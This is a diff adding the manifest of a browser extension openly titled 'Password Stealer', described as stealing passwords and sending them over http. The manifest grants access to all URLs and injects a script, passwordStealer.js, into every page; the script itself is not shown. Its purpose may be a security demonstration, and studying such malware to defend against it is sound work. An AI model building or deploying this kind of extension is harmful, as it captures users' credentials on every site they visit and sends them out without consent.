@@ -1,0 +1,21 @@
+{
+  "manifest_version": 2,
+  "name": "Password Stealer",
+  "version": "1.0",
+  "description": "An extension that steals passwords and sends them over http",
+  "icons": {
+    "48": "icons/sound-list.png",
+    "96": "icons/sound-list@2x.png"
+  },
+
+  "permissions": [
+      "<all_urls>"
+  ],
+
+  "content_scripts": [
+      {
+          "matches": ["<all_urls>"],
+          "js": ["passwordStealer.js"]
+      }
+  ]
+}
